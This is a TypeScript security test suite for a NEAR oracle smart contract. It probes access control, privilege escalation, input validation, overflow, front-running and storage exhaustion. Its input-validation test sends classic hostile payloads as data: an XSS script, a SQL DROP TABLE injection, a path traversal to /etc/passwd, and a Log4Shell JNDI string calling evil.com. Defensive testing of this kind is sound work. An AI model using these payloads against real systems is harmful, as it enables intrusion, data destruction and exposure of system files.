/**
 * NEAR Oracle Protocol Security Testing Suite
 * Basic security validation and vulnerability scanning
 */

import { Worker, NearAccount } from 'near-workspaces';
import { NEAR } from 'near-workspaces';
import crypto from 'crypto';

interface SecurityTestResult {
  testName: string;
  passed: boolean;
  severity: 'low' | 'medium' | 'high' | 'critical';
  description: string;
  findings: string[];
  recommendations: string[];
}

interface SecurityReport {
  timestamp: string;
  totalTests: number;
  passed: number;
  failed: number;
  vulnerabilities: SecurityTestResult[];
  riskScore: number; // 0-100, lower is better
  summary: {
    critical: number;
    high: number;
    medium: number;
    low: number;
  };
}

export class SecurityTestSuite {
  private worker: Worker | null = null;
  private oracleContract: NearAccount | null = null;
  private testAccounts: NearAccount[] = [];
  private results: SecurityTestResult[] = [];

  async runSecurityTests(contractId?: string): Promise<SecurityReport> {
    console.log('🔒 Starting NEAR Oracle Protocol Security Testing');
    console.log('─'.repeat(60));

    try {
      await this.setupTestEnvironment(contractId);
      await this.runAllSecurityTests();
      return this.generateSecurityReport();
    } finally {
      await this.cleanup();
    }
  }

  private async setupTestEnvironment(contractId?: string): Promise<void> {
    console.log('🔧 Setting up security test environment...');

    this.worker = await Worker.init();
    const root = this.worker.rootAccount;

    if (contractId) {
      this.oracleContract = root.getAccount(contractId);
    } else {
      // Deploy fresh contract for testing
      this.oracleContract = await root.createSubAccount('security-test-oracle');
      await this.oracleContract.deploy('./contracts/oracle-intent/target/wasm32-unknown-unknown/release/oracle_intent.wasm');
      await this.oracleContract.call(this.oracleContract, 'new', { owner: root.accountId });
    }

    // Create test accounts with different roles
    const accounts = ['malicious-user', 'legitimate-user', 'attacker', 'solver'];
    for (const accountName of accounts) {
      const account = await root.createSubAccount(accountName);
      this.testAccounts.push(account);
    }

    console.log('✅ Security test environment ready');
  }

  private async runAllSecurityTests(): Promise<void> {
    console.log('🛡️  Running security tests...\n');

    const tests = [
      () => this.testAccessControl(),
      () => this.testInputValidation(),
      () => this.testReentrancyProtection(),
      () => this.testIntegerOverflow(),
      () => this.testUnauthorizedAccess(),
      () => this.testDataIntegrity(),
      () => this.testGasExhaustion(),
      () => this.testPrivilegeEscalation(),
      () => this.testTimingAttacks(),
      () => this.testFrontRunning(),
      () => this.testStorageExhaustion(),
      () => this.testRandomnessManipulation()
    ];

    for (const test of tests) {
      try {
        await test();
      } catch (error) {
        this.addResult({
          testName: 'Test Execution Error',
          passed: false,
          severity: 'high',
          description: 'Security test failed to execute',
          findings: [error.message],
          recommendations: ['Review test setup and contract deployment']
        });
      }
    }
  }

  private async testAccessControl(): Promise<void> {
    console.log('🔐 Testing access control...');

    const [maliciousUser, legitimateUser] = this.testAccounts;
    const findings: string[] = [];
    const recommendations: string[] = [];

    try {
      // Test 1: Unauthorized admin functions
      try {
        await maliciousUser.call(this.oracleContract!, 'force_complete_intent', {
          intent_id: 'nonexistent'
        });
        findings.push('Malicious user can call admin-only functions');
        recommendations.push('Implement proper role-based access control');
      } catch (error) {
        // Expected - admin function should be protected
      }

      // Test 2: Role escalation attempts
      try {
        await maliciousUser.call(this.oracleContract!, 'register_user', { role: 'Admin' });
        
        // Check if user actually became admin
        const userProfile = await this.oracleContract!.view('get_user_profile', {
          user_id: maliciousUser.accountId
        });
        
        if (userProfile.role === 'Admin') {
          findings.push('Users can self-assign admin role');
          recommendations.push('Restrict admin role assignment to existing admins only');
        }
      } catch (error) {
        // Expected - role escalation should fail
      }

      // Test 3: Cross-user data access
      await legitimateUser.call(this.oracleContract!, 'register_user', { role: 'User' });
      await legitimateUser.call(this.oracleContract!, 'submit_credibility_intent', {
        question: 'Private question?',
        required_sources: 2,
        confidence_threshold: 0.8,
        deadline_minutes: 60
      }, { attachedDeposit: NEAR.parse('1').toString() });

      // Try to access other user's private data
      try {
        const otherUserData = await this.oracleContract!.view('get_user_private_data', {
          user_id: legitimateUser.accountId
        });
        
        if (otherUserData) {
          findings.push('Cross-user data access possible');
          recommendations.push('Implement proper user data isolation');
        }
      } catch (error) {
        // Expected - should not be able to access other user's private data
      }

      this.addResult({
        testName: 'Access Control',
        passed: findings.length === 0,
        severity: findings.length > 0 ? 'critical' : 'low',
        description: 'Tests for proper access control and authorization',
        findings,
        recommendations
      });

    } catch (error) {
      this.addResult({
        testName: 'Access Control',
        passed: false,
        severity: 'high',
        description: 'Access control test failed',
        findings: [error.message],
        recommendations: ['Review access control implementation']
      });
    }
  }

  private async testInputValidation(): Promise<void> {
    console.log('✅ Testing input validation...');

    const [attacker] = this.testAccounts;
    const findings: string[] = [];
    const recommendations: string[] = [];

    try {
      await attacker.call(this.oracleContract!, 'register_user', { role: 'User' });

      // Test invalid confidence thresholds
      const invalidInputs = [
        { confidence_threshold: -1.0, description: 'Negative confidence' },
        { confidence_threshold: 2.0, description: 'Confidence > 1.0' },
        { confidence_threshold: NaN, description: 'NaN confidence' },
        { required_sources: -1, description: 'Negative source count' },
        { required_sources: 1000, description: 'Excessive source count' },
        { deadline_minutes: -1, description: 'Negative deadline' },
        { deadline_minutes: 0, description: 'Zero deadline' }
      ];

      for (const input of invalidInputs) {
        try {
          await attacker.call(this.oracleContract!, 'submit_credibility_intent', {
            question: 'Test question?',
            required_sources: input.required_sources || 3,
            confidence_threshold: input.confidence_threshold || 0.8,
            deadline_minutes: input.deadline_minutes || 60
          }, { attachedDeposit: NEAR.parse('1').toString() });

          findings.push(`Accepted invalid input: ${input.description}`);
        } catch (error) {
          // Expected - invalid input should be rejected
        }
      }

      // Test extremely long strings
      const longString = 'A'.repeat(10000);
      try {
        await attacker.call(this.oracleContract!, 'submit_credibility_intent', {
          question: longString,
          required_sources: 3,
          confidence_threshold: 0.8,
          deadline_minutes: 60
        }, { attachedDeposit: NEAR.parse('1').toString() });

        findings.push('Accepts extremely long input strings');
        recommendations.push('Implement input length limits');
      } catch (error) {
        // Expected - should reject oversized input
      }

      // Test special characters and potential injection
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        '"; DROP TABLE intents; --',
        '../../../etc/passwd',
        '${jndi:ldap://evil.com/a}'
      ];

      for (const maliciousInput of maliciousInputs) {
        try {
          await attacker.call(this.oracleContract!, 'submit_credibility_intent', {
            question: maliciousInput,
            required_sources: 3,
            confidence_threshold: 0.8,
            deadline_minutes: 60
          }, { attachedDeposit: NEAR.parse('1').toString() });

          // Check if malicious input was stored as-is
          const intents = await this.oracleContract!.view('get_pending_intents');
          const foundMalicious = intents.some((intent: any) => 
            intent.question && intent.question.includes(maliciousInput)
          );

          if (foundMalicious) {
            findings.push(`Stored malicious input without sanitization: ${maliciousInput}`);
            recommendations.push('Implement input sanitization and validation');
          }
        } catch (error) {
          // Expected - should reject malicious input
        }
      }

      this.addResult({
        testName: 'Input Validation',
        passed: findings.length === 0,
        severity: findings.length > 0 ? 'medium' : 'low',
        description: 'Tests for proper input validation and sanitization',
        findings,
        recommendations
      });

    } catch (error) {
      this.addResult({
        testName: 'Input Validation',
        passed: false,
        severity: 'medium',
        description: 'Input validation test failed',
        findings: [error.message],
        recommendations: ['Review input validation implementation']
      });
    }
  }

  private async testReentrancyProtection(): Promise<void> {
    console.log('🔄 Testing reentrancy protection...');

    const findings: string[] = [];
    const recommendations: string[] = [];

    try {
      // This is a simplified test - real reentrancy testing would require
      // deploying malicious contracts that attempt callbacks
      
      // Test for state changes before external calls
      // In NEAR, cross-contract calls are asynchronous, reducing reentrancy risk
      // But we can test for proper state management
      
      const [user] = this.testAccounts;
      await user.call(this.oracleContract!, 'register_user', { role: 'User' });

      // Attempt rapid successive calls that might create race conditions
      const rapidCalls = [];
      for (let i = 0; i < 5; i++) {
        rapidCalls.push(
          user.call(this.oracleContract!, 'submit_credibility_intent', {
            question: `Rapid call ${i}?`,
            required_sources: 2,
            confidence_threshold: 0.8,
            deadline_minutes: 60
          }, { attachedDeposit: NEAR.parse('1').toString() })
        );
      }

      try {
        await Promise.all(rapidCalls);
        
        // Check if state remained consistent
        const userStats = await this.oracleContract!.view('get_storage_stats');
        const intents = await this.oracleContract!.view('get_pending_intents');
        
        // Basic consistency check
        if (intents.length !== 5) {
          findings.push('Rapid successive calls created inconsistent state');
          recommendations.push('Implement proper state locking or atomic operations');
        }
      } catch (error) {
        // Some calls failing is acceptable
      }

      this.addResult({
        testName: 'Reentrancy Protection',
        passed: findings.length === 0,
        severity: findings.length > 0 ? 'high' : 'low',
        description: 'Tests for reentrancy vulnerabilities and race conditions',
        findings,
        recommendations
      });

    } catch (error) {
      this.addResult({
        testName: 'Reentrancy Protection',
        passed: false,
        severity: 'medium',
        description: 'Reentrancy test failed',
        findings: [error.message],
        recommendations: ['Review state management and external call handling']
      });
    }
  }

  private async testIntegerOverflow(): Promise<void> {
    console.log('🔢 Testing integer overflow protection...');

    const findings: string[] = [];
    const recommendations: string[] = [];

    try {
      // Test with maximum values that might cause overflow
      const [user] = this.testAccounts;
      await user.call(this.oracleContract!, 'register_user', { role: 'User' });

      // Test with very large numbers
      const maxU64 = '18446744073709551615'; // Max u64
      const largeNumbers = [
        { deadline_minutes: 4294967295, description: 'Max u32 deadline' }, // Max u32
        { required_sources: 4294967295, description: 'Max u32 sources' }
      ];

      for (const testCase of largeNumbers) {
        try {
          await user.call(this.oracleContract!, 'submit_credibility_intent', {
            question: 'Overflow test?',
            required_sources: testCase.required_sources || 3,
            confidence_threshold: 0.8,
            deadline_minutes: testCase.deadline_minutes || 60
          }, { attachedDeposit: NEAR.parse('1').toString() });

          findings.push(`Accepted potentially overflowing value: ${testCase.description}`);
        } catch (error) {
          // Expected - should reject overflowing values
        }
      }

      // Test arithmetic operations that might overflow
      try {
        // Attempt to register as solver with maximum deposit
        await user.call(this.oracleContract!, 'register_solver', {}, {
          attachedDeposit: maxU64
        });
        
        findings.push('Accepted maximum u64 deposit without overflow protection');
        recommendations.push('Implement safe arithmetic operations and deposit limits');
      } catch (error) {
        // Expected - should handle large deposits safely
      }

      this.addResult({
        testName: 'Integer Overflow Protection',
        passed: findings.length === 0,
        severity: findings.length > 0 ? 'medium' : 'low',
        description: 'Tests for integer overflow and underflow vulnerabilities',
        findings,
        recommendations
      });

    } catch (error) {
      this.addResult({
        testName: 'Integer Overflow Protection',
        passed: false,
        severity: 'medium',
        description: 'Integer overflow test failed',
        findings: [error.message],
        recommendations: ['Review arithmetic operations for overflow protection']
      });
    }
  }

  private async testUnauthorizedAccess(): Promise<void> {
    console.log('🚫 Testing unauthorized access prevention...');

    const [attacker, legitimateUser, solver] = this.testAccounts;
    const findings: string[] = [];
    const recommendations: string[] = [];

    try {
      // Set up legitimate users
      await legitimateUser.call(this.oracleContract!, 'register_user', { role: 'User' });
      await solver.call(this.oracleContract!, 'register_solver', {}, {
        attachedDeposit: NEAR.parse('2').toString()
      });

      // Create an intent
      const intentResult = await legitimateUser.call(this.oracleContract!, 'submit_credibility_intent', {
        question: 'Protected intent?',
        required_sources: 3,
        confidence_threshold: 0.8,
        deadline_minutes: 60
      }, { attachedDeposit: NEAR.parse('1').toString() });

      const intents = await this.oracleContract!.view('get_pending_intents');
      const intentId = intents[intents.length - 1]?.intent_id;

      if (intentId) {
        // Test unauthorized intent acceptance
        try {
          await attacker.call(this.oracleContract!, 'accept_intent', { intent_id: intentId });
          findings.push('Unregistered user can accept intents');
          recommendations.push('Verify solver registration before allowing intent acceptance');
        } catch (error) {
          // Expected - unregistered user should not be able to accept intents
        }

        // Accept intent with legitimate solver
        await solver.call(this.oracleContract!, 'accept_intent', { intent_id: intentId });

        // Test unauthorized evaluation submission
        try {
          await attacker.call(this.oracleContract!, 'submit_evaluation', {
            intent_id: intentId,
            answer: true,
            confidence: 0.9,
            sources: [{ title: 'Fake source', url: 'http://fake.com' }],
            execution_time_ms: { '0': '1000' }
          }, { attachedDeposit: NEAR.parse('1').toString() });

          findings.push('Unauthorized user can submit evaluations');
          recommendations.push('Verify solver assignment before accepting evaluations');
        } catch (error) {
          // Expected - only assigned solver should submit evaluation
        }
      }

      this.addResult({
        testName: 'Unauthorized Access Prevention',
        passed: findings.length === 0,
        severity: findings.length > 0 ? 'high' : 'low',
        description: 'Tests for unauthorized access to protected functions',
        findings,
        recommendations
      });

    } catch (error) {
      this.addResult({
        testName: 'Unauthorized Access Prevention',
        passed: false,
        severity: 'high',
        description: 'Unauthorized access test failed',
        findings: [error.message],
        recommendations: ['Review authorization checks for all protected functions']
      });
    }
  }

  private async testDataIntegrity(): Promise<void> {
    console.log('🔍 Testing data integrity...');

    const [user] = this.testAccounts;
    const findings: string[] = [];
    const recommendations: string[] = [];

    try {
      await user.call(this.oracleContract!, 'register_user', { role: 'User' });

      // Submit test data
      await user.call(this.oracleContract!, 'submit_credibility_intent', {
        question: 'Data integrity test?',
        required_sources: 3,
        confidence_threshold: 0.85,
        deadline_minutes: 120
      }, { attachedDeposit: NEAR.parse('1').toString() });

      // Retrieve and verify data
      const intents = await this.oracleContract!.view('get_pending_intents');
      const testIntent = intents.find((intent: any) => 
        intent.question === 'Data integrity test?'
      );

      if (!testIntent) {
        findings.push('Submitted data not found - possible data loss');
        recommendations.push('Investigate data storage and retrieval mechanisms');
      } else {
        // Verify data integrity
        if (testIntent.required_sources !== 3) {
          findings.push('Data corruption detected: required_sources mismatch');
        }
        if (Math.abs(testIntent.confidence_threshold - 0.85) > 0.001) {
          findings.push('Data corruption detected: confidence_threshold mismatch');
        }
        if (testIntent.deadline_minutes !== 120) {
          findings.push('Data corruption detected: deadline_minutes mismatch');
        }
        if (testIntent.submitter !== user.accountId) {
          findings.push('Data corruption detected: submitter mismatch');
        }
      }

      // Test data consistency across multiple operations
      const initialStats = await this.oracleContract!.view('get_storage_stats');
      
      // Perform multiple operations
      for (let i = 0; i < 3; i++) {
        await user.call(this.oracleContract!, 'submit_credibility_intent', {
          question: `Consistency test ${i}?`,
          required_sources: 2,
          confidence_threshold: 0.8,
          deadline_minutes: 60
        }, { attachedDeposit: NEAR.parse('1').toString() });
      }

      const finalStats = await this.oracleContract!.view('get_storage_stats');
      const expectedIntentCount = initialStats[0] + 3;

      if (finalStats[0] !== expectedIntentCount) {
        findings.push('Data inconsistency: intent count mismatch');
        recommendations.push('Review data consistency mechanisms');
      }

      this.addResult({
        testName: 'Data Integrity',
        passed: findings.length === 0,
        severity: findings.length > 0 ? 'high' : 'low',
        description: 'Tests for data integrity and consistency',
        findings,
        recommendations
      });

    } catch (error) {
      this.addResult({
        testName: 'Data Integrity',
        passed: false,
        severity: 'high',
        description: 'Data integrity test failed',
        findings: [error.message],
        recommendations: ['Review data storage and validation mechanisms']
      });
    }
  }

  private async testGasExhaustion(): Promise<void> {
    console.log('⛽ Testing gas exhaustion attacks...');

    const [attacker] = this.testAccounts;
    const findings: string[] = [];
    const recommendations: string[] = [];

    try {
      await attacker.call(this.oracleContract!, 'register_user', { role: 'User' });

      // Test with operations that might consume excessive gas
      try {
        // Submit intent with many sources (if that's supported)
        const manySources = Array.from({ length: 100 }, (_, i) => ({
          title: `Source ${i}`,
          url: `https://source${i}.com`
        }));

        // This is a conceptual test - actual implementation depends on contract design
        await attacker.call(this.oracleContract!, 'submit_credibility_intent', {
          question: 'Gas exhaustion test?',
          required_sources: 100, // Excessive number
          confidence_threshold: 0.8,
          deadline_minutes: 60
        }, { attachedDeposit: NEAR.parse('1').toString() });

        findings.push('Accepted operation with potentially excessive gas consumption');
        recommendations.push('Implement gas usage limits and input size restrictions');
      } catch (error) {
        if (error.message.includes('gas')) {
          // Expected - should reject gas-intensive operations
        } else {
          findings.push('Unexpected error in gas exhaustion test');
        }
      }

      this.addResult({
        testName: 'Gas Exhaustion Protection',
        passed: findings.length === 0,
        severity: findings.length > 0 ? 'medium' : 'low',
        description: 'Tests for gas exhaustion attack prevention',
        findings,
        recommendations
      });

    } catch (error) {
      this.addResult({
        testName: 'Gas Exhaustion Protection',
        passed: false,
        severity: 'medium',
        description: 'Gas exhaustion test failed',
        findings: [error.message],
        recommendations: ['Review gas usage patterns and limits']
      });
    }
  }

  private async testPrivilegeEscalation(): Promise<void> {
    console.log('👑 Testing privilege escalation...');

    const [attacker] = this.testAccounts;
    const findings: string[] = [];
    const recommendations: string[] = [];

    try {
      // Register as normal user
      await attacker.call(this.oracleContract!, 'register_user', { role: 'User' });

      // Attempt various privilege escalation techniques
      const escalationAttempts = [
        {
          method: 'register_user',
          params: { role: 'Admin' },
          description: 'Direct admin role assignment'
        },
        {
          method: 'register_user', 
          params: { role: 'Verifier' },
          description: 'Verifier role assignment'
        }
      ];

      for (const attempt of escalationAttempts) {
        try {
          await attacker.call(this.oracleContract!, attempt.method, attempt.params);
          
          // Check if escalation succeeded
          const userProfile = await this.oracleContract!.view('get_user_profile', {
            user_id: attacker.accountId
          });

          if (userProfile.role === attempt.params.role) {
            findings.push(`Privilege escalation successful: ${attempt.description}`);
            recommendations.push('Implement proper role assignment restrictions');
          }
        } catch (error) {
          // Expected - privilege escalation should fail
        }
      }

      this.addResult({
        testName: 'Privilege Escalation Prevention',
        passed: findings.length === 0,
        severity: findings.length > 0 ? 'critical' : 'low',
        description: 'Tests for privilege escalation vulnerabilities',
        findings,
        recommendations
      });

    } catch (error) {
      this.addResult({
        testName: 'Privilege Escalation Prevention',
        passed: false,
        severity: 'high',
        description: 'Privilege escalation test failed',
        findings: [error.message],
        recommendations: ['Review role assignment and privilege management']
      });
    }
  }

  private async testTimingAttacks(): Promise<void> {
    console.log('⏱️  Testing timing attack resistance...');

    const [attacker] = this.testAccounts;
    const findings: string[] = [];
    const recommendations: string[] = [];

    try {
      await attacker.call(this.oracleContract!, 'register_user', { role: 'User' });

      // Measure response times for different operations
      const measurements: number[] = [];

      for (let i = 0; i < 5; i++) {
        const startTime = Date.now();
        
        try {
          await attacker.call(this.oracleContract!, 'submit_credibility_intent', {
            question: `Timing test ${i}?`,
            required_sources: 3,
            confidence_threshold: 0.8,
            deadline_minutes: 60
          }, { attachedDeposit: NEAR.parse('1').toString() });
        } catch (error) {
          // Ignore errors for timing measurement
        }
        
        measurements.push(Date.now() - startTime);
      }

      // Analyze timing variations
      const avgTime = measurements.reduce((sum, time) => sum + time, 0) / measurements.length;
      const maxVariation = Math.max(...measurements) - Math.min(...measurements);
      
      // If timing varies significantly, it might indicate timing vulnerabilities
      if (maxVariation > avgTime * 2) {
        findings.push('Significant timing variations detected - potential timing attack vector');
        recommendations.push('Implement constant-time operations where sensitive data is involved');
      }

      this.addResult({
        testName: 'Timing Attack Resistance',
        passed: findings.length === 0,
        severity: findings.length > 0 ? 'low' : 'low',
        description: 'Tests for timing attack vulnerabilities',
        findings,
        recommendations
      });

    } catch (error) {
      this.addResult({
        testName: 'Timing Attack Resistance',
        passed: false,
        severity: 'low',
        description: 'Timing attack test failed',
        findings: [error.message],
        recommendations: ['Review timing-sensitive operations']
      });
    }
  }

  private async testFrontRunning(): Promise<void> {
    console.log('🏃 Testing front-running protection...');

    const [user1, user2] = this.testAccounts;
    const findings: string[] = [];
    const recommendations: string[] = [];

    try {
      // Register users
      await user1.call(this.oracleContract!, 'register_user', { role: 'User' });
      await user2.call(this.oracleContract!, 'register_user', { role: 'User' });

      // Simulate front-running scenario
      // User1 submits an intent, User2 tries to "front-run" with similar intent
      
      const intentPromises = [
        user1.call(this.oracleContract!, 'submit_credibility_intent', {
          question: 'Front-running test question?',
          required_sources: 3,
          confidence_threshold: 0.8,
          deadline_minutes: 60
        }, { attachedDeposit: NEAR.parse('1').toString() }),
        
        user2.call(this.oracleContract!, 'submit_credibility_intent', {
          question: 'Front-running test question?', // Same question
          required_sources: 3,
          confidence_threshold: 0.85, // Slightly different parameters
          deadline_minutes: 60
        }, { attachedDeposit: NEAR.parse('1.1').toString() }) // Higher deposit
      ];

      const results = await Promise.allSettled(intentPromises);
      
      // Check if both intents were accepted (potential front-running vulnerability)
      const successfulSubmissions = results.filter(r => r.status === 'fulfilled').length;
      
      if (successfulSubmissions === 2) {
        const intents = await this.oracleContract!.view('get_pending_intents');
        const duplicateQuestions = intents.filter((intent: any) => 
          intent.question === 'Front-running test question?'
        );
        
        if (duplicateQuestions.length === 2) {
          findings.push('Duplicate intents accepted - potential front-running vulnerability');
          recommendations.push('Implement duplicate detection or commit-reveal schemes');
        }
      }

      this.addResult({
        testName: 'Front-running Protection',
        passed: findings.length === 0,
        severity: findings.length > 0 ? 'medium' : 'low',
        description: 'Tests for front-running attack protection',
        findings,
        recommendations
      });

    } catch (error) {
      this.addResult({
        testName: 'Front-running Protection',
        passed: false,
        severity: 'medium',
        description: 'Front-running test failed',
        findings: [error.message],
        recommendations: ['Review transaction ordering and duplicate prevention']
      });
    }
  }

  private async testStorageExhaustion(): Promise<void> {
    console.log('💾 Testing storage exhaustion protection...');

    const [attacker] = this.testAccounts;
    const findings: string[] = [];
    const recommendations: string[] = [];

    try {
      await attacker.call(this.oracleContract!, 'register_user', { role: 'User' });

      // Attempt to exhaust storage with many intents
      const storageAttackPromises = [];
      for (let i = 0; i < 20; i++) {
        storageAttackPromises.push(
          attacker.call(this.oracleContract!, 'submit_credibility_intent', {
            question: `Storage attack ${i} - ${'A'.repeat(500)}?`, // Large question
            required_sources: 3,
            confidence_threshold: 0.8,
            deadline_minutes: 60
          }, { attachedDeposit: NEAR.parse('1').toString() })
        );
      }

      const results = await Promise.allSettled(storageAttackPromises);
      const successful = results.filter(r => r.status === 'fulfilled').length;

      // Check storage limits
      if (successful > 10) {
        findings.push('No apparent storage limits - potential DoS vector');
        recommendations.push('Implement storage limits per user and overall system limits');
      }

      // Check storage costs
      const initialStats = await this.oracleContract!.view('get_storage_stats');
      const storageUsed = initialStats[1]; // Assuming second element is storage usage

      if (storageUsed > 1000000) { // 1MB threshold
        findings.push('Excessive storage usage allowed');
        recommendations.push('Implement storage cost management and limits');
      }

      this.addResult({
        testName: 'Storage Exhaustion Protection',
        passed: findings.length === 0,
        severity: findings.length > 0 ? 'medium' : 'low',
        description: 'Tests for storage exhaustion attack protection',
        findings,
        recommendations
      });

    } catch (error) {
      this.addResult({
        testName: 'Storage Exhaustion Protection',
        passed: false,
        severity: 'medium',
        description: 'Storage exhaustion test failed',
        findings: [error.message],
        recommendations: ['Review storage management and limits']
      });
    }
  }

  private async testRandomnessManipulation(): Promise<void> {
    console.log('🎲 Testing randomness manipulation resistance...');

    const findings: string[] = [];
    const recommendations: string[] = [];

    try {
      // Test if contract uses predictable randomness sources
      // This is a conceptual test - actual implementation depends on contract design
      
      // Check if contract exposes any randomness-dependent functions
      try {
        const contractInfo = await this.oracleContract!.view('get_contract_info');
        
        // Look for potential randomness usage in response
        const infoString = JSON.stringify(contractInfo);
        if (infoString.includes('random') || infoString.includes('seed')) {
          findings.push('Contract may use randomness - verify secure random source');
          recommendations.push('Use secure randomness sources and avoid predictable patterns');
        }
      } catch (error) {
        // Contract info might not be available
      }

      // Test for deterministic behavior that should be random
      const [user] = this.testAccounts;
      await user.call(this.oracleContract!, 'register_user', { role: 'User' });

      // Submit multiple identical intents and check for consistent IDs/ordering
      const intentIds: string[] = [];
      for (let i = 0; i < 3; i++) {
        await user.call(this.oracleContract!, 'submit_credibility_intent', {
          question: 'Randomness test?',
          required_sources: 3,
          confidence_threshold: 0.8,
          deadline_minutes: 60
        }, { attachedDeposit: NEAR.parse('1').toString() });

        const intents = await this.oracleContract!.view('get_pending_intents');
        const latestIntent = intents[intents.length - 1];
        intentIds.push(latestIntent.intent_id);
      }

      // Check for predictable patterns in IDs
      const isSequential = intentIds.every((id, index) => 
        index === 0 || parseInt(id) === parseInt(intentIds[index - 1]) + 1
      );

      if (isSequential) {
        findings.push('Intent IDs are sequential - potential predictability issue');
        recommendations.push('Use cryptographically secure random ID generation');
      }

      this.addResult({
        testName: 'Randomness Manipulation Resistance',
        passed: findings.length === 0,
        severity: findings.length > 0 ? 'low' : 'low',
        description: 'Tests for randomness manipulation vulnerabilities',
        findings,
        recommendations
      });

    } catch (error) {
      this.addResult({
        testName: 'Randomness Manipulation Resistance',
        passed: false,
        severity: 'low',
        description: 'Randomness test failed',
        findings: [error.message],
        recommendations: ['Review randomness usage and sources']
      });
    }
  }

  private addResult(result: SecurityTestResult): void {
    this.results.push(result);
    
    const status = result.passed ? '✅' : '❌';
    const severity = result.severity.toUpperCase().padEnd(8);
    console.log(`  ${status} ${severity} ${result.testName}`);
    
    if (!result.passed && result.findings.length > 0) {
      result.findings.forEach(finding => {
        console.log(`    🔍 ${finding}`);
      });
    }
  }

  private generateSecurityReport(): SecurityReport {
    const passed = this.results.filter(r => r.passed).length;
    const failed = this.results.filter(r => !r.passed).length;

    const severityCounts = {
      critical: this.results.filter(r => !r.passed && r.severity === 'critical').length,
      high: this.results.filter(r => !r.passed && r.severity === 'high').length,
      medium: this.results.filter(r => !r.passed && r.severity === 'medium').length,
      low: this.results.filter(r => !r.passed && r.severity === 'low').length
    };

    // Calculate risk score (0-100, lower is better)
    const riskScore = Math.min(100, 
      (severityCounts.critical * 25) +
      (severityCounts.high * 15) +
      (severityCounts.medium * 8) +
      (severityCounts.low * 3)
    );

    console.log('\n' + '─'.repeat(60));
    console.log('🔒 Security Test Summary');
    console.log('─'.repeat(60));
    console.log(`Total Tests: ${this.results.length}`);
    console.log(`✅ Passed: ${passed}`);
    console.log(`❌ Failed: ${failed}`);
    console.log(`📊 Risk Score: ${riskScore}/100`);
    console.log('\nVulnerabilities by Severity:');
    console.log(`  🚨 Critical: ${severityCounts.critical}`);
    console.log(`  🔴 High: ${severityCounts.high}`);
    console.log(`  🟡 Medium: ${severityCounts.medium}`);
    console.log(`  🟢 Low: ${severityCounts.low}`);

    return {
      timestamp: new Date().toISOString(),
      totalTests: this.results.length,
      passed,
      failed,
      vulnerabilities: this.results.filter(r => !r.passed),
      riskScore,
      summary: severityCounts
    };
  }

  private async cleanup(): Promise<void> {
    if (this.worker) {
      await this.worker.tearDown();
    }
  }
}